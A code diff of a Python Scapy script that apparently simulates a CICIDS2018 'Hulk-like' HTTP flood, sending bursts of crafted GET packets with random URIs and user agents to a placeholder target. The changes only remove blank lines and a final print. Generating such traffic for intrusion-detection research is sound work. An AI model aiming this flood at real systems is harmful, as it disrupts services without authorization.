@@ -16,9 +16,7 @@ DELAY = 0.0003
 
 def generate_hulk_like_attack():
     print("[*] Starting CICIDS2018 Hulk-like attack simulation...\n")
-
     for burst in range(PACKET_BURSTS):
-
         src_port = random.randint(1024, 65535) 
         uri = f"/test/{random.randint(1,999999)}"
         user_agent = random.choice([
@@ -27,9 +25,7 @@ def generate_hulk_like_attack():
             "python-requests/2.26",
             "Wget/1.19.4"
         ])
-
         for i in range(BURST_SIZE):
-
             payload = (
                 f"GET {uri} HTTP/1.1\r\n"
                 f"Host: {TARGET_IP}\r\n"
@@ -37,19 +33,14 @@ def generate_hulk_like_attack():
                 f"Accept: */*\r\n"
                 f"Connection: Keep-Alive\r\n\r\n"
             ).encode()
-
             pkt = (
                 IP(dst=TARGET_IP) /
                 TCP(sport=src_port, dport=TARGET_PORT, flags="PA") /
                 Raw(load=payload)
             )
-
             send(pkt, verbose=0)
             time.sleep(DELAY)
-
         print(f"[+] Burst {burst+1}/{PACKET_BURSTS} sent.")
-
-    print("\nAttack simulation complete!")
 
 if __name__ == "__main__":
     generate_hulk_like_attack()
